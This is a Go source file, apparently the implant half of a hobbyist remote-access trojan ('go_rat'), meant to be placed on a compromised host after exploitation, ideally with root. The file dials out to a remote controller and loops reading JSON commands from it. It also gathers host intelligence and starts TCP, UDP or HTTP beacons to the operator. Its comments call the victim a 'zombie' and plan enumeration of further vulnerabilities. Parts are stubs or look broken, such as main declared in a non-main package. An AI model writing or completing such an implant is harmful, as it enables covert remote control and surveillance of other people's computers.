/*/
This is the file that will be compiled into the binary
	that gets placed on the target host

We are using the feature outlined in :
	- https://golang.org/cmd/go/#hdr-Build_constraints

	Placing the tag "+build some_tag_here"
		as a comment "//"
		at the top of the file
		and using "go build -tags some_tag_here"

	will compile main.go with code from that file mixed in

/*/
package target_binary

// import the libraries we need
import (
	"bufio"
	"fmt"

	/*/
	IMPORTING MODULES FROM GOMODCACHE DIRECTORY
		A useful way to make multiple binaries with common code
		- depends on the folder structure and module naming
		- gomodcache is also, invisibly, the pkg directory in the workspace


	/*/
	"go_rat/pkg/shared_code"
	"net"
)

// function to provide outbound connections via threading
//-----------------Local IP---------Remote IP---------PORT-------
func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
	// the network functions return two objects
	// a connection
	// and an error
	connection, err := net.DialTCP("tcp", &laddr, &raddr)
	//generic error printing
	// if error isnt empty/null/nothingness
	if err != nil {
		// print the error
		shared_code.Error_printer(err, "[-] Error: TCP Connection Failed")
		return
	}
	// if there was no error, continue to the control loop
	// will be basis of control flow
	// we Assume all communication from the controller to be in json only
	// we are only sending encoded json so we should only react to encoded json
	for {
		netData, error := bufio.NewReader(connection).ReadString('\n')
		// again with the error checking, what are we? Hackers?
		if error != nil {
			fmt.Println(error)
			return
		}
		// need to create the struct! The one that holds the data!
		// The data for Commands
		shared_code.Json_extract(netData)

	}
	//sending wat!?!?
	//connection.Write("asdf")
}

/*
control flow for network operation with tcp protocol
this function will contain the logic to spawn threads
of the following functions

*/
func Tcp_network_io() {

	//generic error printing
	//if err != nil {
	//	fmt.Println(err)
	//	return
	//}

}

// once placed on the target host and executed post exploitation, prefferably with root
/// level permissions, We need to:
//	- send a beacon with a conditional dependant on environment/preference
// 	- run the input/output operations if that environment is right
//  - enumerate host intel, either passively or aggressively
//  - enumerate network information
//  - enumerate further vulnerabilities
//

/*/
A goroutine is a lightweight thread managed by the Go runtime.
	go f(x, y, z)
starts a new goroutine running
	f(x, y, z)
The evaluation of f, x, y, and z happens in the current goroutine and the execution
of f happens in the new goroutine.
Goroutines run in the same address space, so access to shared memory must be synchronized
/*/
func main() {
	// regardless of the beacon state, and anything else. I am going to instantiate a
	// new CommandSet pool to handle anything we send/receive later...
	// we know where this zombie is... right?
	// are we even doin this in the right hekin order?
	// what determines the right order anyways?!!?
	CommandPool := shared_code.NewCommandSet()
	ZombieInformation := shared_code.NewHostIntel()

	// start gathering all the info
	shared_code.GatherIntel(ZombieInformation)

	if shared_code.BEACON_ON_START == true {
		switch shared_code.BACON_TYPE {
		case "tcp":
			go shared_code.BaconTCP()
		case "udp":
			go shared_code.BeaconUDP()
		case "http":
			go shared_code.BeaconHTTP()
		}
	}
	shared_code.GetTCPConnections()
}
